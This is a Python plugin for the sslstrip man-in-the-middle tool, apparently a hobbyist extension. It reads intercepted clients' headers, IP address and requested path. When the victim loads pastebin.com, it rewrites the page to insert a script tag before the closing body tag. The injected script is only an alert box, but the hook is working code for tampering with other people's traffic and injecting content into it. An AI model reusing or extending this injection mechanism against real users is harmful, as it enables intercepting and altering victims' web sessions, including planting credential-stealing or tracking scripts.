"""s1plugin is a extension for Moxie Marlinspike's sslstrip."""
 
__author__ = "SizeOne"
__email__  = ""
__license__= """
 
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License as
published by the Free Software Foundation; either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but
WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
General Public License for more details.

http://sizeonedev.wordpress.com/2011/12/04/sslstrip-mod-t…upport-plugins/

"""
from s1plugin.S1DummyPlugin import S1DummyPlugin
import urllib

class S1Plugin(S1DummyPlugin):
	def __init__(self):
		self.name = "InjectCode"
		self.author = "SizeOne"
		self.version = "1.0"
		self.s1version = ["1.0"] #only works for s1plugin ver 1.0
		self.url = "http://sizeone.net"
		self.help = "This plugin injects some messages in pages :)"
		
	def injectContent(self,client,contentType,data):
		#random things from client
		host              = client.getHeader("host")
		headers           = client.cleanHeaders()
		ip            	  = client.getClientIP()
		path              = client.getPathFromUri()
		url               = 'http://' + host + path
		#check content
		#you can also get content type like this
		ct = client.responseHeaders.getRawHeaders('content-type')
		if(('text/html' in contentType) or ('text/html;' in contentType)):
			if(url=="http://pastebin.com/"):
				data=data.replace('</body>','<script>alert("Injected Code! :D")</script></body>')
		#you must return the page or else nothing will show up
		return data